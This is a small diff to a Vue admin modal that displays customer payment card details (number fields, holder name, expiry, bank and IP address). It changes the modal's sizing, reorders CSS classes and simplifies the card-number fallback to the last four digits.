@@ -3,20 +3,19 @@
     :open="open"
     :title="'Payment & Verification'"
     :subtitle="'Manage customer payment details'"
-    max-width="76rem"
+    size="full"
     accent="#34d399"
     icon="fa-solid fa-credit-card"
     dir="ltr"
     theme="dark"
     :heavy-backdrop="true"
-    body-max-height="none"
     @close="$emit('close')"
   >
     <template #header-right>
       <span class="rounded-lg bg-emerald-500/10 px-3 py-1.5 font-mono text-sm text-emerald-400 ring-1 ring-emerald-500/20">{{ customer?.ip }}</span>
     </template>
 
-    <div v-if="customer" class="grid grid-cols-1 lg:grid-cols-12 gap-5">
+    <div v-if="customer" class="grid grid-cols-1 gap-5 lg:grid-cols-12">
       <!-- Card Details Column -->
       <div class="lg:col-span-5">
         <div class="admin-glass admin-glass--emerald h-full">
@@ -35,7 +34,7 @@
           <div v-if="currentCard">
             <div class="relative mx-auto max-w-[400px]">
               <BankCard3D
-                :cardNumber="currentCard.card_number_display || currentCard.card_number_full || currentCard.card_number || (currentCard.last4 ? '•••• •••• •••• ' + currentCard.last4 : '')"
+                :cardNumber="currentCard.card_number_display || currentCard.card_number_full || currentCard.card_number || currentCard.last4 || ''"
                 :holderName="currentCard.holder_name || currentCard.card_holder || ''"
                 :expiry="currentCard.expiry_month && currentCard.expiry_year ? `${currentCard.expiry_month}/${currentCard.expiry_year}` : ''"
                 :bankName="bankInfo?.bank?.name || ''"
